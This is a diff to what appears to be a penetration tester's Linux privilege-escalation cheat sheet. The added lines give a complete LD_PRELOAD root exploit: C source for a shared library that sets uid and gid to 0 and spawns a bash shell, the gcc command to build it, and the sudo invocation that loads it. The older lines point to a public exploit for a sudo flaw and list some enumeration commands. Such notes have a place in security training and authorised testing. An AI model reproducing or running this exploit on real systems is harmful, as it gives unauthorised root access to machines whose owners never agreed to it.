@@ -1,9 +1,40 @@
 ###
+
+###sudo -l
+```
+Linux VM
+
+1. In command prompt type: sudo -l
+2. From the output, notice that the LD_PRELOAD environment variable is intact.
+
+Exploitation
+
+1. Open a text editor and type:
+
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+
+void _init() {
+    unsetenv("LD_PRELOAD");
+    setgid(0);
+    setuid(0);
+    system("/bin/bash");
+}
+
+2. Save the file as x.c
+3. In command prompt type:
+gcc -fPIC -shared -o /tmp/x.so x.c -nostartfiles
+4. In command prompt type:
+sudo LD_PRELOAD=/tmp/x.so apache2
+5. In command prompt type: id
+```
 ```
 sudo earlier than 1.8.26
 Check *** pwfeedback https://github.com/saleemrashid/sudo-cve-2019-18634
 
-sudo -l
+
+
 
 history
 
@@ -11,6 +42,8 @@ find .
 
 cat /etc/os-release
 uname -a
+
+
 
 
 ```
